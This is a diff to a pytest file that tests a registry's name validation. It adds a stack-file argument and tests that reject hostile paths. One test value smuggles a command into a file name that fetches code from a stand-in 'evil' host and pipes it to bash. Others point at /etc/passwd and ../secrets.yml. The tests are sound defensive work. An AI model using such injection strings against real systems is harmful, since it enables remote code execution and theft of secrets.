@@ -7,25 +7,52 @@ from cloudapp import registry
 # --- validate_names: the gate on caller-controlled identifiers ---
 
 def test_validate_names_accepts_valid():
-    registry.validate_names("dev", "orders", "acme/orders")
+    registry.validate_names("dev", "orders", "acme/orders", "cloud-app.yml")
 
 
 @pytest.mark.parametrize("env", ["../dev", "Dev", "", "a" * 41, "dev/prod", "de v", "-dev"])
 def test_validate_names_rejects_bad_env(env):
     with pytest.raises(registry.RegistryError, match="environment name"):
-        registry.validate_names(env, "orders", "acme/orders")
+        registry.validate_names(env, "orders", "acme/orders", "cloud-app.yml")
 
 
 @pytest.mark.parametrize("name", ["../orders", "Orders", "", "a" * 41, "or ders"])
 def test_validate_names_rejects_bad_stack_name(name):
     with pytest.raises(registry.RegistryError, match="stack name"):
-        registry.validate_names("dev", name, "acme/orders")
+        registry.validate_names("dev", name, "acme/orders", "cloud-app.yml")
 
 
 @pytest.mark.parametrize("repo", ["acme", "acme/orders/extra", "acme/", "/orders", "acme orders", ""])
 def test_validate_names_rejects_bad_caller_repo(repo):
     with pytest.raises(registry.RegistryError, match="caller repo"):
-        registry.validate_names("dev", "orders", repo)
+        registry.validate_names("dev", "orders", repo, "cloud-app.yml")
+
+
+def test_validate_names_accepts_ordinary_stack_files():
+    registry.validate_names("dev", "orders-api", "acme/orders", "cloud-app.yml")
+    registry.validate_names("dev", "orders-api", "acme/orders", "subdir/app.yml")
+
+
+def test_validate_names_rejects_shell_metacharacters_in_stack_file():
+    with pytest.raises(registry.RegistryError, match="stack file"):
+        registry.validate_names(
+            "dev", "orders-api", "acme/orders", 'a";curl -s https://evil/x|bash;#.yml'
+        )
+
+
+def test_validate_names_rejects_absolute_stack_file():
+    with pytest.raises(registry.RegistryError, match="stack file"):
+        registry.validate_names("dev", "orders-api", "acme/orders", "/etc/passwd")
+
+
+def test_validate_names_rejects_parent_traversal_in_stack_file():
+    with pytest.raises(registry.RegistryError, match="stack file"):
+        registry.validate_names("dev", "orders-api", "acme/orders", "../secrets.yml")
+
+
+def test_validate_names_rejects_empty_stack_file():
+    with pytest.raises(registry.RegistryError, match="stack file"):
+        registry.validate_names("dev", "orders-api", "acme/orders", "")
 
 
 # --- resolve_stack_path: path-traversal containment ---
